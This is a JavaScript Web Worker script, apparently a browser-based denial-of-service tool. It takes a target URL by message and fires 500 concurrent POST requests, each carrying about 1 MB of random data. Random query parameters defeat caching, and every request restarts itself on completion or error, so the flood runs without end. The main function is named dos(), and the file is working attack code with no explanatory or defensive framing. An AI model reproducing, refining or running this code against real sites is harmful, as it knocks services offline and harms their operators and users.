var base = "";
function randomString(length) {
    //Adapted slightly from http://www.xinotes.org/notes/note/515/
    //By James
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz'.split(''); 
    var str = '';
    for (var i = 0; i < length; i++) {
        str += chars[Math.floor(Math.random() * chars.length)];
    }
    return str;
}
var post_data = randomString(4)+"="+randomString(1048576);
var gparam = randomString(4);
function makeURL(){
    //makes a request URL with random base, so answer can't be cached    
    var date = new Date();
    if(base.indexOf("?")==-1){
        return base+"?"+gparam+"="+Math.floor(Math.random()*10000000000);
    } else {
        return base+"?"+gparam+"="+Math.floor(Math.random()*10000000000);
    }
}

function infoReceived(xmlhttp)
{
    //Start new request if connection completes
    if (xmlhttp.readyState==4){
        setTimeout('makeRequest();',1);
    }
}
function err(e){
    //make sure we start a new request on error -> Firefox needs this
    setTimeout('makeRequest();',1);
}
function makeRequest()
{
    //make a new URL and request it via POST
    var fullUrl = makeURL();
    var httpRequest = new XMLHttpRequest();
    httpRequest.open("POST", fullUrl, true);
    httpRequest.setRequestHeader("Content-Type","text/plain; charset=utf-8");
    httpRequest.onreadystatechange = infoReceived;
    httpRequest.onerror = err;
    httpRequest.send(post_data);
}

function dos() {
    //start the initial 500 requests
    var i = 0;
    for(i=0;i<500;i++){
        makeRequest();
    }
}
self.onmessage = function(e) {
    base = e.data;
	dos();
}
